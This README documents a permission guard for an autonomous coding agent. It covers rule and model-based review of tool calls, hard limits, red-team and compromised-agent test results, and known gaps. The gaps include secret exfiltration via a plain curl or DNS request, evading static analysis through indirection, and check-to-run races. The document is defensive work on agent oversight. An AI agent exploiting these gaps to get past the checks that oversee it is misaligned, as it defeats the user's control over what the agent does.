# Auto Mode Safe and Auto Mode Autonomous

Two ways to let Pi work without you approving every call.

| Mode | Status bar | When nothing clears a call | Use it when |
|---|---|---|---|
| **Auto Mode Safe** | `AUTO SAFE` | Asks you | You are around, and would rather be asked than lose a useful stop |
| **Auto Mode Autonomous** | `AUTONOMOUS` | Blocks it, and the agent carries on | You want to leave it running |
| YOLO | `YOLO` | Runs it: this guard is off | The machine or sandbox is disposable |

Switch with `/mode safe`, `/mode autonomous` or `/mode yolo`, or cycle with **Alt+M**. `/mode auto` still works and means safe. To start in a mode, set `"mode"` in the config. Switching lasts for the session.

Autonomous never shows a prompt. Anything it holds back is listed by `/automode blocked` with the reason, and the agent is told to report it under "Blocked" at the end. Say yes in chat and the next attempt runs, because your words are what it checks.

## How a call is decided

```
tool call
  1. Rules          read the shell command: allow, hard stop, or send it on
  2. Effects        read the code it runs: network, credentials, deletes, dynamic code
  3. Review memory  same call over the same content gets the same decision
  4. Jev            four questions: serves the task, you named it, lasting harm, suspicious
  5. Second opinion the chat model, with the rule book, for what is still unclear
  6. Mode           safe asks you, autonomous blocks
```

Most calls end at step 1, with no model involved. Steps 2 and 3 run on your machine. In a real session a typical call the rules settle costs nothing, and a Jev call costs about $0.00002.

The important part is what a model **cannot** do, whatever it says:

| What | Rule |
|---|---|
| Wiping `/`, `$HOME` or a system folder, formatting a disk, fork bombs | Never runs in any mode |
| The guard's own files, Pi's `settings.json`, `pi --no-extensions`, setting `PI_AUTOMODE_MODE` | No model can approve these. Safe asks you; autonomous blocks |
| Your own `ask` rules | Safe asks you; autonomous blocks |
| Credential reads, root, downloaded code, Pi's files, `AGENTS.md` | Only with your own words **and** a second opinion that agrees |
| Code measured as dangerous (a credential plus any network, obfuscated execution) | Only with your clear words **and** a second opinion |
| Acting outside the project or on shared state (push, publish, ssh, outside writes, deletes, hard resets) | Only with your words. Looking like a sensible step of the task is not enough |
| Jev says suspicious at 60% or more and you did not name it | No second opinion can clear it |

These limits came from testing. A red-team run found Jev and the second opinion both clearing `prettier --write ~/.bashrc` and a curl carrying a token, because each looked like a reasonable step.

### Everyday work runs

Reads, builds, tests, local git work and edits inside the project are allowed by the rules. A script the session wrote is read first, and runs when what it does stays local: a loopback test harness runs, the same file changed to read `auth.json` does not. Changing a script means it is reviewed again; an unchanged one is not.

Orca's coordination commands are allowed by subcommand (`orchestration send`, `ask`, `check`, listing commands). Starting agents and sending to other terminals are judged, and anything reaching another machine is treated as outward. No `orca *` rule is needed.

### Failures

A model that fails never allows anything by failing.

- **Jev down or out of quota:** the chat model answers its four questions. After a quota error Jev is left alone for 10 minutes.
- **Second opinion down:** safe asks. Autonomous runs only code measured as local that Jev rates harmless, and blocks the rest as retryable.
- **Both down:** what the rules allow still runs. Safe asks. Autonomous blocks as retryable.

## Setup

The modes use the context decider. With Jev through OpenRouter, and the chat model only for second opinions:

```json
{
  "mode": "autonomous",
  "decider": ["context"],
  "context": { "provider": "openrouter", "model": "typesafe/jev-1.14", "timeoutMs": 4000 },
  "llm": { "provider": "opencode-go", "model": "deepseek-v4.1-flash" }
}
```

Log in with `/login` for each provider. LANCET is optional: add `"command"` to `decider` and calls it is very sure about skip Jev. With `decider` left at `["llm"]` the modes still work, but without effects analysis and Jev, so they ask or block more.

Thresholds are under `judge` in `config.example.jsonc`. They were tuned on one model version, so re-measure if you change it.

### Commands

| Command | What it does |
|---|---|
| `/mode [safe\|autonomous\|yolo]` | Switch mode, or open a picker |
| `/automode status` | Mode, deciders, counts for the session |
| `/automode blocked` | What was held back, and why |
| `/automode trust <text>` | Your own standing statement for this session, read by Jev as your words. `/automode trust` clears it |
| `/automode on\|off` | Back to the starting mode, or yolo |

`/automode-classifier` still works as the long name.

### Subagents

A child Pi inherits safe or autonomous through `PI_AUTOMODE_MODE`, never yolo. Without a UI, a safe-mode call that would ask is resolved as autonomous does, unless `withoutUi.onAsk` is `"allow"`.

## Measured results

Jev 1.14 through OpenRouter, DeepSeek v4.1 Flash as second opinion. Thresholds were tuned only on the tune split. One small rule change (native programs inside PowerShell) landed after the holdout run; the live lab ran with it, and the replay and red-team ran just before it.

**Holdout, cases never used for tuning:**

| | Safe | Autonomous |
|---|---|---|
| Danger that ran | 0 of 73 | 0 of 73 |
| The prompt episodes from the original feedback, interrupted | 0 of 11 | 0 of 11 |
| Everyday coding calls interrupted | 1 of 71 | 2 of 71 |
| Actions you named, wrongly stopped | 0 of 22 | 0 of 22 |
| Prompts | allowed | 0 |
| Older benchmark's "safe" commands stopped | 11 of 37 | 10 of 37 |

Most of that last row is `git push`, `ssh` or `yay` with no request naming them, and hard limits such as a disk write, which the benchmark labelled safe. Stopping them is what the outward rule is for.

**Red-team:** two rounds of attacks written by reading this code, 223 cases: 0 run in either mode, after fixing what they found. The first round got 110 of 142 through and the second, against those fixes, 43 of 100, so expect a third round to find more. Those totals exclude the two limits below, and some first-round cases were relabelled after review.

**Your real sessions:** 800 calls replayed in autonomous: 0 prompts, 43 of 798 blocked (5.4%). Most are stops worth keeping: environment dumps, credential greps, reading `auth.json`, editing this guard from inside itself. The replay runs in a throwaway repository, so edits a session made to its own project look like outside writes, which inflates this number.

**Live, real Pi over RPC, 13 ordinary scenarios plus 8 compromised-agent scenarios, in both modes:** all 26 benign, temptation and injection runs completed their task with no harm and 0 prompts, and one call blocked. A compromised agent was told in its system prompt to attack canary files: 41 attempts made, every damaging one stopped (the 2 that ran were `npm test` after the test swap before it was blocked). Autonomous prompted 0 times. The whole lab cost $0.05.

Before this work the same feedback session raised at least 29 prompts.

## What it does not protect against

Read these before leaving it unattended.

- **It is not a sandbox.** It judges tool calls. For real isolation use a container or VM.
- **A repository that was already malicious when you opened it.** `npm test`, `pytest`, `go test` and `make` run the project's code, and the rules allow them because that is what development is. The guard scans what the runner invokes and everything changed since the session began, so an agent cannot plant code and run it this way. It does not audit every file of a repository you cloned. `eval/cases/redteam-committed.jsonl` holds those cases, which still run.
- **A secret carried by a plain web request.** `curl https://host/a1b2c3` or a DNS lookup of `a1b2c3.host` looks like ordinary web access and runs, as do the cases in `eval/cases/redteam-network-limit.jsonl`. It only matters if the agent already holds a secret, and reading secrets is what the guard stops.
- **Static analysis can be beaten.** Effects analysis reads code without running it. Determined indirection across files, or fetching code at run time, can hide intent from it. Unknown or dynamic behaviour falls to the models rather than being trusted, and models are less reliable than rules.
- **Data leaving through allowed channels.** A commit you asked to push carries whatever is in it. A secret typed into a request you named goes where you named.
- **Text the agent reads is not checked.** Injected instructions are refused by the model or stopped when acted on; nothing screens files as they are read.
- **What it sees is what it judges.** Between the check and the run, a file can change. The window is small, but it exists.
- **Developing this guard under itself.** The guard locks its own folder, so run it from an installed copy. Security test suites full of attack strings read as dangerous, and running them will be blocked.

## What the models see

Jev gets your messages, the command, the measured effects and recent commands with their outcomes. It never gets tool output, file contents or the agent's prose. The second opinion gets your messages, the session's tool calls and the contents of the code being run. Tokens, keys and `password=` values are masked before anything leaves your machine.

## Testing it

```sh
npm test                 # rules, effects, decision table, handler; no network
npm run test:windows
npm run eval             # the corpus through the real handler, live Jev and judge
npm run eval:live        # real Pi sessions: benign tasks, temptations, injection, a compromised agent
```

`eval/README.md` explains the corpus. Responses are cached under `eval/results/cache`, so reruns are nearly free. `eval/cases/private/` holds replays of your own sessions and is ignored by git.
